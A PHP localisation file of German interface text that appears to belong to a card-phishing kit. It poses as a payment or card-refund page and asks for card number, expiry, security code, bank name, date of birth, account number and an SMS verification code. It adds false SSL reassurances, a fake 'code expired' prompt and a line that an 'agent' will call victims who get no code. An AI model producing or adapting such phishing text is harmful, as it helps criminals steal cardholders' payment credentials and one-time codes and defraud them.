<?php
$language = array(
    'title' => array(
        '1' => 'Zahlung',
    ),
	
    'secure_text' => array(
        '1' => 'Mit SSL-Technologie',
		'2' => 'Ihre persönlichen Daten sind immer geschützt.',
    ),
	
    'card_title' => array(
		'1' => 'Meine Karte gutschreiben',
    ),

    'order_btn' => array(
		'1' => 'Zahlung',
		'2' => 'Sichere Zahlung per SSL',
    ),

    'biling' => array(
		'1' => 'Ihre Kontaktdaten',
		'2' => 'Vorname',
		'3' => 'Nachname',
		'4' => 'E-Mail',
    ),
    
	'details_submit' => array(
		'1' => 'Weiter',
    ),

    'paiement_iframe'   => array(
        'details_title' => array(
			'1' => '1 Zahlungen',
			'2' => 'Zahlungsinfo',
			'3' => 'Kosten',
			'4' => 'Detail',
			'5' => 'Zwischensumme',
			'6' => 'Mehrwertsteuer',
			'7' => 'Gesamt',
			'8' => 'Geben Sie Ihre Zahlungsinformationen ein',
        ),
        'formpayment' => array(
			'1' => 'Telefonnummer',
			'2' => 'Kartennummer',
			'3' => 'Ablaufdatum',
			'4' => 'Sicherheitscode',
			'5' => 'Validieren',
		),
    ),

    'vbv' => array(
        'lines' => array(
			'1' => ' ',
			'2' => 'schützt deine',
			'3' => 'Karte gegen unbefugte Online-Nutzung - ohne zusätzliche Kosten. Benutzen',
			'4' => 'Bitte bestätigen Sie den per SMS erhaltenen Code, um die Zahlung zu erhalten',
			'5' => 'dann auf validieren klicken',
            '6' => 'Nb: Wenn Sie keinen Code erhalten, werden Sie von einem unserer Agenten angerufen, um den Vorgang abzuschließen',
        ),
		'1' => 'Händler',
		'2' => 'Objekte',
		'3' => 'Datum',
		'4' => 'Kartennummer',
		'5' => 'Kartenart',
		'6' => 'Name der Bank',
		'7' => 'Name, wie auf der Karte angegeben',
		'8' => 'Geburtsdatum des Hauptkarteninhabers',
		'9' => 'Private Prüfungsummer',
		'10' => 'Kontonummer',
		'11' => 'Validieren',
		'12' => '"Code abgelaufen, bitte warten Sie, bis in 30 Sekunden ein neuer Code an Sie gesendet wird"',
		'13' => '"Ungültig"',
    ),

    'footer_top'   => array(
		'1' => 'Kontaktieren Sie uns',
		'2' => 'Verkaufsbedingungen',
		'3' => 'Store erstellt mit',
		'4' => 'Sicherheitsrichtlinie',
    ),
    
);

?>